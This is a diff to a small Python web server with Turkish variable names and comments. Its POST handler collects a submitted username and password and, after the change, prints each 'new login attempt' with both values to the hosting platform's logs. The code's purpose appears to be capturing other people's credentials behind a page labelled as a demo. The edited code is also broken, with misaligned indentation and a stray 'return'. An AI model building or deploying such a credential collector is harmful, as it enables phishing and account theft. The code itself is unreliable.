@@ -89,7 +89,7 @@ class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.cevap(HTML)
 
-  def do_POST(self):
+   def do_POST(self):
         uzunluk = int(self.headers.get("Content-Length", 0))
         if uzunluk > 4096:
             self.send_error(413)
@@ -105,19 +105,14 @@ class Handler(BaseHTTPRequestHandler):
             self.send_error(400)
             return
 
-        with DOSYA.open("a", encoding="utf-8") as f:
-            f.write(
-                f"Tarih: {datetime.now():%Y-%m-%d %H:%M:%S}\n"
-                f"Demo kullanıcı: {kullanici}\n"
-                f"Örnek kod: {ornek}\n"
-                f"---\n"
-            )
-
-        # Gelen bilgileri loglara yazdıran satır
-        print(f"--> YENİ GİRİŞ: Kullanıcı={kullanici} | Şifre={ornek}")
+        # Gelen bilgileri doğrudan loglara yazdırıyoruz
+        print(f"=== YENİ GİRİŞ DENEMESİ ===")
+        print(f"Kullanıcı Adı: {kullanici}")
+        print(f"Parola/Örnek: {ornek}")
+        print(f"Tarih: {datetime.now():%Y-%m-%d %H:%M:%S}")
+        print("=" * 30)
 
         self.cevap(SONUC)
-        
         # Bu satırı ekleyerek gelen bilgilerin Render loglarında görünmesini sağlıyoruz:
         print(f"---> YENİ GİRİŞ: Kullanıcı={kullanici} | Şifre={ornek}")
             return
